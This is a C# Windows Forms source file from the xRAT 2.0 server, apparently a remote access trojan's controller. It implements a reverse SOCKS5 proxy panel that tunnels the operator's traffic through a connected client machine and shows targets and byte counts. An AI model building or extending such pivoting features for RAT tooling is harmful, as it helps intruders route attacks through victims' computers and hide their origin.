using System;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.ReverseProxy;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        private readonly Client _connectClient;
        private ReverseProxyServer SocksServer { get; set; }
        private delegate void Invoky();

        public FrmReverseProxy(Client client)
        {
            InitializeComponent();
            _connectClient = client;
            _connectClient.Value.FrmProxy = this;
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(_connectClient, "0.0.0.0", (int)nudServerPort.Value);
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                btnStop_Click(sender, null);
            }
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {
            if (proxyClient.ListItem != null)
            {
                this.Invoke(new Invoky(() =>
                {
                    lock (LvConnections)
                    {
                        string totalReceivedStr = GetSizeStr(proxyClient.LengthReceived);
                        string totalSendStr = GetSizeStr(proxyClient.LengthSended);

                        proxyClient.ListItem.SubItems[0].Text = proxyClient.TargetServer;
                        proxyClient.ListItem.SubItems[1].Text = proxyClient.TargetPort.ToString();

                        if (proxyClient.ListItem.SubItems[2].Text != totalReceivedStr)
                            proxyClient.ListItem.SubItems[2].Text = totalReceivedStr;

                        if (proxyClient.ListItem.SubItems[3].Text != totalSendStr)
                            proxyClient.ListItem.SubItems[3].Text = totalSendStr;



                        if (!proxyClient.IsConnected)
                        {
                            LvConnections.Items.Remove(proxyClient.ListItem);
                        }
                    }
                }));
            }
        }

        private string GetSizeStr(long size)
        {
            if (size > (1024 * 1024 * 1024))
                return (size / (1024 * 1024 * 1024)) + "GB";

            if (size > (1024 * 1024))
                return (size / (1024 * 1024)) + "MB";

            if (size > 1024)
                return (size / 1024) + "KB";

            return size + "B";
        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {
            if (proxyClient.ListItem == null)
            {
                this.Invoke(new Invoky(() =>
                {
                    lock (LvConnections)
                    {
                        proxyClient.ListItem = new ListViewItem(new string[]
                        {
                            proxyClient.TargetServer,
                            proxyClient.TargetPort.ToString(),
                            proxyClient.LengthReceived/1024 + "KB",
                            proxyClient.LengthSended/1024 + "KB",
                            proxyClient.Type.ToString()
                        }) { Tag = proxyClient };
                        LvConnections.Items.Add(proxyClient.ListItem);
                    }
                }));
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Stop the proxy server if still active
            btnStop_Click(sender, null);

            if (_connectClient.Value != null)
                _connectClient.Value.FrmProxy = null;
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this Socks5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }
    }
}